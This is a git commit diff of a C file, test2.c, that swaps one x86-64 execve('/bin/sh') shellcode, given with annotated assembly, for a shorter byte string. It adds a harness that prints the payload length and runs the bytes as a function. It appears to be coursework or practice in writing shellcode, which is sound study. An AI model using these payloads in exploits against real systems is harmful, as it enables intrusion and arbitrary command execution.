415fc55da0b832fe2f8609d242de160f43148aa2
Melody Liu <liu00401@umn.edu>
2020-10-23 17:10:48 -0500

    more

--- test2.c
+++ test2.c
@@ -1,18 +1,11 @@
-int main(void)
+#include <stdio.h>
+#include <string.h>
+
+char code[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
+
+int main()
 {
-    char shellcode[] =
-    "\x48\x31\xd2"                                  // xor    %rdx, %rdx
-    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      // mov	$0x68732f6e69622f2f, %rbx
-    "\x48\xc1\xeb\x08"                              // shr    $0x8, %rbx
-    "\x53"                                          // push   %rbx
-    "\x48\x89\xe7"                                  // mov    %rsp, %rdi
-    "\x50"                                          // push   %rax
-    "\x57"                                          // push   %rdi
-    "\x48\x89\xe6"                                  // mov    %rsp, %rsi
-    "\xb0\x3b"                                      // mov    $0x3b, %al
-    "\x0f\x05";                                     // syscall
- 
-    (*(void (*)()) shellcode)();
-     
+    printf("len:%d bytes\n", strlen(code));
+    (*(void(*)()) code)();
     return 0;
 }
